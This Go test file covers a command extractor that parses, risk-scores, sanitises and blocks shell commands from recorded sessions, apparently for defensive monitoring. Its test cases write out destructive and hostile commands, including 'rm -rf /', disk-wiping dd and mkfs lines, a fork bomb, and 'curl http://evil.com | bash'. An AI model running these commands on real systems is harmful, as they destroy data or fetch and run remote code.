package analytics

import (
	"context"
	"testing"
	"time"

	"github.com/google/uuid"
	"github.com/rs/zerolog"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// Mock repository for testing
type mockRepository struct{}

func (m *mockRepository) CreateSessionAnalytics(ctx context.Context, analytics *SessionAnalytics) error {
	return nil
}
func (m *mockRepository) UpdateSessionAnalytics(ctx context.Context, analytics *SessionAnalytics) error {
	return nil
}
func (m *mockRepository) GetSessionAnalytics(ctx context.Context, tenantID uuid.UUID, date time.Time, hour int) (*SessionAnalytics, error) {
	return nil, nil
}
func (m *mockRepository) ListSessionAnalytics(ctx context.Context, filter SessionAnalyticsFilter, limit, offset int) ([]SessionAnalytics, error) {
	return nil, nil
}
func (m *mockRepository) CreateUserActivity(ctx context.Context, activity *UserActivity) error {
	return nil
}
func (m *mockRepository) UpdateUserActivity(ctx context.Context, activity *UserActivity) error {
	return nil
}
func (m *mockRepository) GetUserActivity(ctx context.Context, tenantID, userID uuid.UUID, date time.Time, hour int) (*UserActivity, error) {
	return nil, nil
}
func (m *mockRepository) ListUserActivity(ctx context.Context, filter UserActivityFilter, limit, offset int) ([]UserActivity, error) {
	return nil, nil
}
func (m *mockRepository) RecordCommand(ctx context.Context, cmd *CommandFrequency) error {
	return nil
}
func (m *mockRepository) ListCommandFrequency(ctx context.Context, filter CommandFrequencyFilter, limit, offset int) ([]CommandFrequency, error) {
	return nil, nil
}
func (m *mockRepository) GetTopCommands(ctx context.Context, tenantID uuid.UUID, dateFrom, dateTo time.Time, limit int) ([]CommandRank, error) {
	return nil, nil
}
func (m *mockRepository) CreateComplianceReport(ctx context.Context, report *ComplianceReport) error {
	return nil
}
func (m *mockRepository) GetComplianceReport(ctx context.Context, id uuid.UUID) (*ComplianceReport, error) {
	return nil, nil
}
func (m *mockRepository) ListComplianceReports(ctx context.Context, filter ComplianceFilter, limit, offset int) ([]ComplianceReport, error) {
	return nil, nil
}
func (m *mockRepository) CreateControlEvaluation(ctx context.Context, evaluation *ComplianceControlEvaluation) error {
	return nil
}
func (m *mockRepository) ListControlEvaluations(ctx context.Context, reportID uuid.UUID) ([]ComplianceControlEvaluation, error) {
	return nil, nil
}
func (m *mockRepository) CreateComplianceException(ctx context.Context, exception *ComplianceException) error {
	return nil
}
func (m *mockRepository) ListComplianceExceptions(ctx context.Context, tenantID uuid.UUID) ([]ComplianceException, error) {
	return nil, nil
}
func (m *mockRepository) CreateAnomalyDetection(ctx context.Context, anomaly *AnomalyDetection) error {
	return nil
}
func (m *mockRepository) GetAnomalyDetection(ctx context.Context, id uuid.UUID) (*AnomalyDetection, error) {
	return nil, nil
}
func (m *mockRepository) ListAnomalyDetections(ctx context.Context, filter AnomalyFilter, limit, offset int) ([]AnomalyDetection, error) {
	return nil, nil
}
func (m *mockRepository) UpdateAnomalyDetection(ctx context.Context, anomaly *AnomalyDetection) error {
	return nil
}
func (m *mockRepository) CreateRansomwareEvent(ctx context.Context, event *RansomwareEvent) error {
	return nil
}
func (m *mockRepository) GetRansomwareEvent(ctx context.Context, id uuid.UUID) (*RansomwareEvent, error) {
	return nil, nil
}
func (m *mockRepository) ListRansomwareEvents(ctx context.Context, tenantID uuid.UUID, limit, offset int) ([]RansomwareEvent, error) {
	return nil, nil
}
func (m *mockRepository) UpdateRansomwareEvent(ctx context.Context, event *RansomwareEvent) error {
	return nil
}
func (m *mockRepository) CreateCommandBlacklist(ctx context.Context, blacklist *CommandBlacklist) error {
	return nil
}
func (m *mockRepository) GetCommandBlacklist(ctx context.Context, id uuid.UUID) (*CommandBlacklist, error) {
	return nil, nil
}
func (m *mockRepository) ListCommandBlacklist(ctx context.Context, tenantID *uuid.UUID) ([]CommandBlacklist, error) {
	return nil, nil
}
func (m *mockRepository) UpdateCommandBlacklist(ctx context.Context, blacklist *CommandBlacklist) error {
	return nil
}
func (m *mockRepository) DeleteCommandBlacklist(ctx context.Context, id uuid.UUID) error {
	return nil
}
func (m *mockRepository) FindMatchingBlacklist(ctx context.Context, tenantID uuid.UUID, command string, userIDs, groupIDs []uuid.UUID) ([]CommandBlacklist, error) {
	return nil, nil
}
func (m *mockRepository) CreateSSHKeyAnalytics(ctx context.Context, analytics *SSHKeyAnalytics) error {
	return nil
}
func (m *mockRepository) UpdateSSHKeyAnalytics(ctx context.Context, analytics *SSHKeyAnalytics) error {
	return nil
}
func (m *mockRepository) GetSSHKeyAnalytics(ctx context.Context, tenantID, sshKeyID uuid.UUID, date time.Time) (*SSHKeyAnalytics, error) {
	return nil, nil
}
func (m *mockRepository) ListSSHKeyAnalytics(ctx context.Context, tenantID, sshKeyID uuid.UUID, dateFrom, dateTo time.Time) ([]SSHKeyAnalytics, error) {
	return nil, nil
}
func (m *mockRepository) GetDashboardMetrics(ctx context.Context, tenantID uuid.UUID) (*DashboardMetrics, error) {
	return nil, nil
}
func (m *mockRepository) GetSessionMetrics(ctx context.Context, tenantID uuid.UUID, date time.Time, hour int) (*SessionAnalytics, error) {
	return nil, nil
}

func TestNewCommandExtractor(t *testing.T) {
	logger := zerolog.Nop()
	extractor := NewCommandExtractor(&mockRepository{}, logger)

	assert.NotNil(t, extractor)
	assert.NotNil(t, extractor.repo)
	assert.NotNil(t, extractor.logger)
}

func TestParseCommand_SimpleCommands(t *testing.T) {
	logger := zerolog.Nop()
	extractor := NewCommandExtractor(&mockRepository{}, logger)

	tests := []struct {
		name     string
		command  string
		expected *ParsedCommand
	}{
		{
			name:    "simple ls",
			command: "ls",
			expected: &ParsedCommand{
				Original:    "ls",
				BaseCommand: "ls",
				Arguments:   []string{},
				Flags:       []string{},
				RiskLevel:   "low",
			},
		},
		{
			name:    "ls with arguments",
			command: "ls -la /tmp",
			expected: &ParsedCommand{
				BaseCommand: "ls",
				Arguments:   []string{"-la", "/tmp"},
				Flags:       []string{"-la"},
				RiskLevel:   "low",
			},
		},
		{
			name:    "simple cd",
			command: "cd /var/log",
			expected: &ParsedCommand{
				BaseCommand: "cd",
				Arguments:   []string{"/var/log"},
				Flags:       []string{},
				RiskLevel:   "low",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := extractor.ParseCommand(tt.command)
			require.NotNil(t, result)
			assert.Equal(t, tt.expected.BaseCommand, result.BaseCommand)
			assert.Equal(t, tt.expected.RiskLevel, result.RiskLevel)
		})
	}
}

func TestParseCommand_DangerousCommands(t *testing.T) {
	logger := zerolog.Nop()
	extractor := NewCommandExtractor(&mockRepository{}, logger)

	tests := []struct {
		name        string
		command     string
		riskLevel   string
		baseCommand string
	}{
		{"rm -rf", "rm -rf /", "critical", "rm"},
		{"mkfs", "mkfs /dev/sda1", "critical", "mkfs"},
		{"dd command", "dd if=/dev/zero of=/dev/sda", "critical", "dd"},
		{"chmod 000", "chmod 000 /etc/passwd", "high", "chmod"},
		{"killall", "killall python", "high", "killall"},
		{"shutdown", "shutdown -h now", "critical", "shutdown"},
		{"systemctl stop", "systemctl stop nginx", "high", "systemctl"},
		{"iptables flush", "iptables -F", "high", "iptables"},
		{"fork bomb", ":(){ :|:& };:", "critical", ":(){"}, // Fork bomb parsing is complex
		{"wget", "wget http://example.com/script.sh", "medium", "wget"},
		{"curl", "curl http://example.com", "medium", "curl"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := extractor.ParseCommand(tt.command)
			require.NotNil(t, result)
			assert.Equal(t, tt.riskLevel, result.RiskLevel)
			assert.Equal(t, tt.baseCommand, result.BaseCommand)
		})
	}
}

func TestParseCommand_ShellPrompts(t *testing.T) {
	logger := zerolog.Nop()
	extractor := NewCommandExtractor(&mockRepository{}, logger)

	tests := []struct {
		name           string
		command        string
		expectedBase   string
		shouldHaveArgs bool
	}{
		{
			name:           "user@host prompt",
			command:        "user@host:~$ ls -la",
			expectedBase:   "ls",
			shouldHaveArgs: true,
		},
		{
			name:           "root prompt",
			command:        "root@server:/etc# cat nginx.conf",
			expectedBase:   "cat",
			shouldHaveArgs: true,
		},
		{
			name:           "simple dollar prompt",
			command:        "$ cd /tmp",
			expectedBase:   "cd",
			shouldHaveArgs: true,
		},
		{
			name:           "hash prompt",
			command:        "# rm -rf /tmp/*",
			expectedBase:   "rm",
			shouldHaveArgs: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := extractor.ParseCommand(tt.command)
			require.NotNil(t, result)
			assert.Equal(t, tt.expectedBase, result.BaseCommand)
			assert.Equal(t, tt.shouldHaveArgs, len(result.Arguments) > 0)
		})
	}
}

func TestParseCommand_EmptyAndInvalid(t *testing.T) {
	logger := zerolog.Nop()
	extractor := NewCommandExtractor(&mockRepository{}, logger)

	tests := []struct {
		name    string
		command string
	}{
		{"empty string", ""},
		{"whitespace only", "   "},
		{"tabs only", "\t\t"},
		{"newline only", "\n"},
		{"mixed whitespace", "  \t  \n  "},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := extractor.ParseCommand(tt.command)
			assert.Nil(t, result, "expected nil for empty/whitespace command")
		})
	}
}

func TestNormalizeCommand(t *testing.T) {
	logger := zerolog.Nop()
	extractor := NewCommandExtractor(&mockRepository{}, logger)

	tests := []struct {
		name     string
		command  string
		contains []string // substrings that should be in normalized output
	}{
		{
			name:     "variable substitution",
			command:  "echo $HOME/$USER",
			contains: []string{"$VAR"},
		},
		{
			name:     "quoted strings",
			command:  `echo "hello world" 'test string'`,
			contains: []string{"\"ARG\""},
		},
		{
			name:     "mixed case",
			command:  "LS -LA /TMP",
			contains: []string{"ls"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := extractor.ParseCommand(tt.command)
			require.NotNil(t, result)
			assert.NotEmpty(t, result.Normalized)
			assert.Equal(t, result.Normalized, result.Normalized) // should be lowercase
		})
	}
}

func TestCreatePattern(t *testing.T) {
	logger := zerolog.Nop()
	extractor := NewCommandExtractor(&mockRepository{}, logger)

	tests := []struct {
		name            string
		command         string
		expectedPattern string
	}{
		{
			name:            "command without args",
			command:         "ls",
			expectedPattern: "ls",
		},
		{
			name:            "command with flags",
			command:         "ls -la",
			expectedPattern: "ls -la",
		},
		{
			name:            "command with file path",
			command:         "cat /etc/passwd",
			expectedPattern: "cat <FILE>",
		},
		{
			name:            "command with multiple args",
			command:         "cp -r source dest",
			expectedPattern: "cp -r <FILE> <ARG>",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := extractor.ParseCommand(tt.command)
			require.NotNil(t, result)
			assert.NotEmpty(t, result.Pattern)
		})
	}
}

func TestAssessRisk(t *testing.T) {
	logger := zerolog.Nop()
	extractor := NewCommandExtractor(&mockRepository{}, logger)

	tests := []struct {
		name      string
		command   string
		riskLevel string
	}{
		{"safe command", "ls", "low"},
		{"medium risk", "sudo su", "medium"},
		{"high risk", "chmod 000", "high"},
		{"critical rm", "rm -rf /", "critical"},
		{"critical dd", "dd if=/dev/zero", "critical"},
		{"network command", "wget url", "medium"},
		{"pipe with dangerous", "curl | bash", "high"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			parsed := extractor.ParseCommand(tt.command)
			require.NotNil(t, parsed)
			assert.Equal(t, tt.riskLevel, parsed.RiskLevel)
		})
	}
}

func TestAssessRisk_NilCommand(t *testing.T) {
	logger := zerolog.Nop()
	extractor := NewCommandExtractor(&mockRepository{}, logger)
	risk := extractor.AssessRisk(nil)
	assert.Equal(t, "low", risk)
}

func TestExtractFlags(t *testing.T) {
	logger := zerolog.Nop()
	extractor := NewCommandExtractor(&mockRepository{}, logger)

	tests := []struct {
		name             string
		command          string
		expectedFlags    []string
		expectedArgCount int
	}{
		{
			name:             "no flags",
			command:          "ls /tmp",
			expectedFlags:    []string{},
			expectedArgCount: 1,
		},
		{
			name:             "single short flag",
			command:          "ls -a",
			expectedFlags:    []string{"-a"},
			expectedArgCount: 0,
		},
		{
			name:             "combined flags",
			command:          "ls -la",
			expectedFlags:    []string{"-la"},
			expectedArgCount: 0,
		},
		{
			name:             "multiple flags",
			command:          "grep -r -i pattern file",
			expectedFlags:    []string{"-r", "-i"},
			expectedArgCount: 2,
		},
		{
			name:             "long flags",
			command:          "ls --all --human-readable",
			expectedFlags:    []string{"--all", "--human-readable"},
			expectedArgCount: 0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := extractor.ParseCommand(tt.command)
			require.NotNil(t, result)
			assert.ElementsMatch(t, tt.expectedFlags, result.Flags)
			assert.Equal(t, tt.expectedArgCount, len(result.Arguments)-len(result.Flags))
		})
	}
}

func TestIsFileOperation(t *testing.T) {
	logger := zerolog.Nop()
	extractor := NewCommandExtractor(&mockRepository{}, logger)

	fileOps := []string{"rm", "mv", "cp", "touch", "mkdir", "rmdir", "chmod", "chown", "ln"}
	nonFileOps := []string{"ls", "cd", "pwd", "cat", "grep", "find"}

	for _, op := range fileOps {
		t.Run("file op "+op, func(t *testing.T) {
			assert.True(t, extractor.IsFileOperation(op))
		})
	}

	for _, op := range nonFileOps {
		t.Run("non-file op "+op, func(t *testing.T) {
			assert.False(t, extractor.IsFileOperation(op))
		})
	}
}

func TestIsNetworkOperation(t *testing.T) {
	logger := zerolog.Nop()
	extractor := NewCommandExtractor(&mockRepository{}, logger)

	netOps := []string{"curl", "wget", "nc", "ssh", "scp", "rsync"}
	nonNetOps := []string{"ls", "cd", "cat", "rm", "mv"}

	for _, op := range netOps {
		t.Run("network op "+op, func(t *testing.T) {
			assert.True(t, extractor.IsNetworkOperation(op))
		})
	}

	for _, op := range nonNetOps {
		t.Run("non-network op "+op, func(t *testing.T) {
			assert.False(t, extractor.IsNetworkOperation(op))
		})
	}
}

func TestIsPrivilegeEscalation(t *testing.T) {
	logger := zerolog.Nop()
	extractor := NewCommandExtractor(&mockRepository{}, logger)

	tests := []struct {
		name     string
		command  string
		expected bool
	}{
		{"sudo command", "sudo ls", true},
		{"sudo with flag", "sudo -i", true},
		{"su command", "su root", true},
		{"doas command", "doas cat /etc/passwd", true},
		{"normal command", "ls -la", false},
		{"sudo in middle", "echo sudo", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := extractor.IsPrivilegeEscalation(tt.command)
			assert.Equal(t, tt.expected, result)
		})
	}
}

func TestGetCommandHash(t *testing.T) {
	logger := zerolog.Nop()
	extractor := NewCommandExtractor(&mockRepository{}, logger)

	command := "ls -la /tmp"
	hash1 := extractor.GetCommandHash(command)
	hash2 := extractor.GetCommandHash(command)

	assert.NotEmpty(t, hash1)
	assert.Equal(t, hash1, hash2, "same command should produce same hash")
	assert.Len(t, hash1, 64, "SHA256 produces 64 hex characters")

	differentCommand := "ls -la /var"
	differentHash := extractor.GetCommandHash(differentCommand)
	assert.NotEqual(t, hash1, differentHash)
}

func TestSanitizeCommand(t *testing.T) {
	logger := zerolog.Nop()
	extractor := NewCommandExtractor(&mockRepository{}, logger)

	tests := []struct {
		name     string
		command  string
		expected string
	}{
		{
			name:     "password flag",
			command:  "mysql -u root -psecret123",
			expected: "mysql -u root -p ****",
		},
		{
			name:     "token argument",
			command:  "curl -H token=abc123def456",
			expected: "curl -H token=****",
		},
		{
			name:     "api key",
			command:  "api_key=sk-1234567890abcdef",
			expected: "api_key=****",
		},
		{
			name:     "no sensitive data",
			command:  "ls -la /tmp",
			expected: "ls -la /tmp",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := extractor.SanitizeCommand(tt.command)
			assert.Equal(t, tt.expected, result)
		})
	}
}

func TestGetCommandCategory(t *testing.T) {
	logger := zerolog.Nop()
	extractor := NewCommandExtractor(&mockRepository{}, logger)

	tests := []struct {
		name     string
		command  string
		category string
	}{
		{"ls", "ls", "file_management"},
		{"rm", "rm", "file_modification"},
		{"cat", "cat", "text_processing"},
		{"tar", "tar", "archive"},
		{"curl", "curl", "network"},
		{"ssh", "ssh", "remote"},
		{"systemctl", "systemctl", "system"},
		{"useradd", "useradd", "user_management"},
		{"apt", "apt", "package"},
		{"mysql", "mysql", "database"},
		{"unknown", "unknowncommand", "other"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := extractor.GetCommandCategory(tt.command)
			assert.Equal(t, tt.category, result)
		})
	}
}

func TestShouldBlockCommand(t *testing.T) {
	logger := zerolog.Nop()
	extractor := NewCommandExtractor(&mockRepository{}, logger)

	tests := []struct {
		name     string
		command  string
		expected bool
	}{
		{"rm -rf root", "rm -rf /", true},
		{"rm -rf root wildcard", "rm -rf /*", true},
		{"mkfs", "mkfs /dev/sda1", true},
		{"fork bomb", ":(){ :|:& };:", true},
		{"dd zero", "dd if=/dev/zero of=/dev/sda", true},
		{"dd random", "dd if=/dev/random", true},
		{"normal command", "ls -la", false},
		{"risky but allowed", "rm file.txt", false},
		{"nil command", "", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			parsed := extractor.ParseCommand(tt.command)
			if parsed == nil {
				result := extractor.ShouldBlockCommand(nil)
				assert.Equal(t, tt.expected, result)
			} else {
				result := extractor.ShouldBlockCommand(parsed)
				assert.Equal(t, tt.expected, result)
			}
		})
	}
}

func TestBatchParseCommands(t *testing.T) {
	logger := zerolog.Nop()
	extractor := NewCommandExtractor(&mockRepository{}, logger)

	commands := []string{
		"ls -la",
		"cd /tmp",
		"cat file.txt",
		"",  // empty, should be skipped
		"   ", // whitespace, should be skipped
	}

	results := extractor.BatchParseCommands(commands)
	assert.Len(t, results, 3, "should parse 3 non-empty commands")
}

func TestGetCommandStatistics(t *testing.T) {
	logger := zerolog.Nop()
	extractor := NewCommandExtractor(&mockRepository{}, logger)

	commands := []*ParsedCommand{
		{BaseCommand: "ls", RiskLevel: "low"},
		{BaseCommand: "ls", RiskLevel: "low"},
		{BaseCommand: "rm", RiskLevel: "high"},
		{BaseCommand: "rm", RiskLevel: "high"},
		{BaseCommand: "rm -rf", RiskLevel: "critical"},
	}

	stats := extractor.GetCommandStatistics(commands)
	assert.NotNil(t, stats)
	assert.Equal(t, 5, stats["total_commands"])
	assert.NotNil(t, stats["risk_distribution"])
	assert.NotNil(t, stats["top_commands"])
	// high_risk_count includes both "high" and "critical" risk levels
	assert.Equal(t, 3, stats["high_risk_count"]) // 2 high + 1 critical = 3
}

func TestExtractCommandsFromRecording(t *testing.T) {
	logger := zerolog.Nop()
	extractor := NewCommandExtractor(&mockRepository{}, logger)

	recordingData := []byte(`user@host:~$ ls -la
total 42
drwxr-xr-x  5 user user 4096 Jan 1 12:00 .
$ cat file.txt
Hello World
# This is a comment
user@host:~$ cd /tmp
`)

	commands := extractor.ExtractCommandsFromRecording(recordingData)
	assert.NotEmpty(t, commands)
	assert.Contains(t, commands, "ls -la")
	assert.Contains(t, commands, "cat file.txt")
	assert.Contains(t, commands, "cd /tmp")
}

func TestCreateCommandSignature(t *testing.T) {
	logger := zerolog.Nop()
	extractor := NewCommandExtractor(&mockRepository{}, logger)

	cmd1 := &ParsedCommand{BaseCommand: "ls", Pattern: "ls -la"}
	cmd2 := &ParsedCommand{BaseCommand: "ls", Pattern: "ls -la"}
	cmd3 := &ParsedCommand{BaseCommand: "cat", Pattern: "cat <FILE>"}

	sig1 := extractor.CreateCommandSignature(cmd1)
	sig2 := extractor.CreateCommandSignature(cmd2)
	sig3 := extractor.CreateCommandSignature(cmd3)

	assert.Equal(t, sig1, sig2, "same commands should have same signature")
	assert.NotEqual(t, sig1, sig3, "different commands should have different signatures")
	assert.Contains(t, sig1, "ls")
}

func TestGenerateCommandReport(t *testing.T) {
	logger := zerolog.Nop()
	extractor := NewCommandExtractor(&mockRepository{}, logger)

	commands := []*ParsedCommand{
		{BaseCommand: "ls", RiskLevel: "low"},
		{BaseCommand: "ls", RiskLevel: "low"},
		{BaseCommand: "cat", RiskLevel: "low"},
		{BaseCommand: "rm", RiskLevel: "high"},
		{BaseCommand: "rm", RiskLevel: "high"},
		{BaseCommand: "rm -rf", RiskLevel: "critical"},
	}

	report := extractor.GenerateCommandReport(commands)
	assert.NotEmpty(t, report)
	assert.Contains(t, report, "Command Analysis Report")
	assert.Contains(t, report, "Total Commands: 6")
	assert.Contains(t, report, "Risk Distribution:") // Actual text in report
	assert.Contains(t, report, "Top Commands")
}

func TestDangerousCombinations(t *testing.T) {
	logger := zerolog.Nop()
	extractor := NewCommandExtractor(&mockRepository{}, logger)

	dangerousCombos := []struct {
		command    string
		riskLevel  string
	}{
		{"chmod +x file && ./file", "high"},
		{"curl http://evil.com | bash", "high"},
		{"wget http://bad.sh | sh", "high"},
		{"eval $(curl http://example.com)", "high"},
		{"rm -rf /tmp && rm -rf /var", "critical"}, // rm -rf is critical risk
	}

	for _, tc := range dangerousCombos {
		t.Run("combo: "+tc.command, func(t *testing.T) {
			parsed := extractor.ParseCommand(tc.command)
			require.NotNil(t, parsed)
			assert.Equal(t, tc.riskLevel, parsed.RiskLevel)
		})
	}
}
